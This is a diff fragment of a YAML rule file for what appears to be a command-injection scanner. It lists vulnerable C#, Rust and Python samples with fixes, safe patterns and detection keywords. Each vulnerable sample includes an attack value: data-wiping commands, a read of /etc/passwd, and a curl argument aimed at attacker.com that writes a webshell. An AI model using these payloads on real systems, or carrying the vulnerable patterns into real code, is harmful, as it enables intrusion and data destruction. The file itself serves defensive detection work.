+        Process.Start("cmd.exe", "/c type " + filename);
+      explanation: "User input concatenated into cmd.exe command string. ATTACK: file=test.txt & del /f /q C:\\*. FIX: new ProcessStartInfo { FileName = 'type', Arguments = filename, UseShellExecute = false }."
+
+    - language: rust
+      label: "Axum + std::process::Command with sh -c and format!"
+      code: |
+        use axum::extract::Query;
+        use std::process::Command;
+
+        async fn ping(Query(params): Query<HashMap<String, String>>) -> String {
+            let host = params.get("host").unwrap();
+            let output = Command::new("sh")
+                .arg("-c")
+                .arg(format!("ping -c 1 {}", host))
+                .output()
+                .expect("failed");
+            String::from_utf8_lossy(&output.stdout).to_string()
+        }
+      explanation: "User input from Axum query extractor interpolated via format!() into shell command. ATTACK: host=127.0.0.1;cat /etc/passwd. FIX: Command::new('ping').arg('-c').arg('1').arg(host) — no shell invocation."
+
+    - language: rust
+      label: "Actix-web + tokio::process::Command with bash -c and format!"
+      code: |
+        use actix_web::{web, HttpResponse};
+        use tokio::process::Command;
+
+        async fn convert(info: web::Json<ConvertRequest>) -> HttpResponse {
+            let filename = &info.filename;
+            let output = Command::new("bash")
+                .arg("-c")
+                .arg(format!("ffmpeg -i {} output.mp4", filename))
+                .output()
+                .await
+                .unwrap();
+            HttpResponse::Ok().body("done")
+        }
+      explanation: "User-provided filename from JSON body reaches bash -c via format!(). ATTACK: filename='input.mp4; rm -rf /'. FIX: Command::new('ffmpeg').arg('-i').arg(filename).arg('output.mp4') — no shell."
+
+    - language: python
+      label: "Argument injection in array-based execution"
+      code: |
+        import subprocess
+        url = request.args.get('url')
+        subprocess.run(["curl", url])
+      explanation: "Safe from command injection (array-based, no shell). BUT VULNERABLE to argument injection (CWE-88). ATTACK: url='http://attacker.com -o /var/www/html/webshell.php' — curl writes to web root. FIX: Validate URL format, use requests library, or subprocess.run(['curl', '--', url])."
+
+  safe:
+    - language: python
+      label: "subprocess with list (no shell)"
+      code: |
+        subprocess.run(["ping", "-c", "1", host])
+      explanation: "Array-based execution with shell=False (default). No shell involved — metacharacters are not interpreted. Each element is a separate argument. Safe from command injection (but check for argument injection if host could contain - prefix)."
+
+    - language: go
+      label: "exec.Command with separate args"
+      code: |
+        cmd := exec.Command("ping", "-c", "1", host)
+        output, _ := cmd.CombinedOutput()
+      explanation: "Go exec.Command with separate arguments — no shell involved. Go never uses a shell by default. Safe from command injection."
+
+    - language: javascript
+      label: "execFile (no shell)"
+      code: |
+        execFile("nslookup", [domain], (err, stdout) => {
+            res.send(stdout);
+        });
+      explanation: "execFile does not invoke a shell. Arguments are passed directly. Safe from command injection."
+
+    - language: rust
+      label: "Command::new with separate args (no shell)"
+      code: |
+        use std::process::Command;
+        let output = Command::new("ping")
+            .arg("-c")
+            .arg("1")
+            .arg(&validated_host)
+            .output()?;
+      explanation: "Rust's default and safest pattern — no shell, separate arguments. std::process::Command never invokes a shell unless you explicitly pass sh -c. Safe from command injection."
+
+    - language: rust
+      label: "Library replacement — safest (no OS command at all)"
+      code: |
+        // Instead of Command::new("sh").arg("-c").arg(format!("cp {} {}", src, dst))
+        std::fs::copy(&src_path, &dst_path)?;
+
+        // Instead of shelling out to curl
+        let resp = reqwest::get(&url).await?;
+      explanation: "No OS command execution at all. Rust crates replace shell commands entirely — std::fs for file operations, reqwest for HTTP. This is the safest possible pattern."
+
+    - language: python
+      label: "Library replacement — safest (no OS command at all)"
+      code: |
+        import shutil
+        shutil.copy(src_path, dst_path)  # Instead of os.system(f"cp {src} {dst}")
+      explanation: "No OS command execution at all. Python standard library replaces shell commands. shutil.copy instead of os.system('cp ...')."
+
+target_strategy:
+  scope: "function"
+  include_imports: true
+  include_type_defs: true
+  adaptive_depth:
+    small: "Deep analysis — trace all data flows, check all command execution (<20 files)"
+    medium: "Focus on route handlers, command execution modules, and files importing OS command APIs (20-200 files)"
+    large: "Surgical — prioritize files importing command execution modules and handling user input (200+ files)"
+  file_patterns:
+    - "**/*.py"
+    - "**/*.java"
+    - "**/*.js"
+    - "**/*.ts"
+    - "**/*.go"
+    - "**/*.rb"
+    - "**/*.php"
+    - "**/*.cs"
+    - "**/*.c"
+    - "**/*.cpp"
+    - "**/*.rs"
+    - "**/*.sh"
+    - "**/*.bash"
+    - "**/Dockerfile"
+    - "**/docker-compose.yml"
+    - "**/.github/workflows/*.yml"
+    - "**/Jenkinsfile"
+    - "**/.gitlab-ci.yml"
+  relevance_signals:
+    # Command execution API imports
+    - "os.system"
+    - "os.popen"
+    - "subprocess"
+    - "import shlex"
+    - "child_process"
+    - "exec("
+    - "execSync"
+    - "execFile"
+    - "spawn("
+    - "ProcessBuilder"
+    - "Runtime.exec"
+    - "Runtime.getRuntime"
+    - "os/exec"
+    - "exec.Command"
+    - "system("
+    - "popen("
+    - "shell_exec"
+    - "passthru"
+    - "proc_open"
+    - "Process.Start"
+    - "ProcessStartInfo"
+    - "std::process::Command"
+    - "tokio::process::Command"
+    - "Command::new"
+    # Shell command names in strings
+    - "ping"
+    - "nslookup"
+    - "curl"
+    - "wget"
+    - "convert"
+    - "ffmpeg"
+    - "tar"
+    - "git"
+    - "rsync"
+    - "nmap"
+    - "dig"
+    - "ssh"
+    - "scp"
+    - "sendmail"
+    # Dangerous patterns
+    - "shell=True"
+    - "shell: true"
+    - "sh -c"
+    - "bash -c"
+    - "cmd /c"
+    - "cmd.exe"
+    - "format!(\""
+    - "fmt.Sprintf"
+    # Rust-specific
+    - "tokio::process"
+    - "std::process"
+    - ".arg(\"-c\")"
+    - "CommandExt"
+    - "raw_arg"
